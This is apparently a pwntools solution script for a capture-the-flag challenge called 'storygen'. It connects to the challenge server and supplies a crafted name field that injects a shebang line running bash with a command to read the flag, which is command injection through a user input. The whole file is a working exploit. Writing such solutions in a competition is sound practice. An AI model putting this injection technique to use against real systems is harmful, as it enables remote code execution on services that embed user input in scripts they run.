#/usr/bin/env python3

from pwn import *

context.log_level = logging.DEBUG

HOST = 'storygen.2023.ctfcompetition.com'
PORT = 1337

r = remote(HOST, PORT)

name = '!/usr/bin/env -S bash -c "/get_flag Give flag please" \\'
r.sendlineafter('name?\n', name)

r.sendlineafter('from?\n', "AAA")

r.sendlineafter('story?\n', 'yes')
r.sendlineafter('story?\n', 'no')

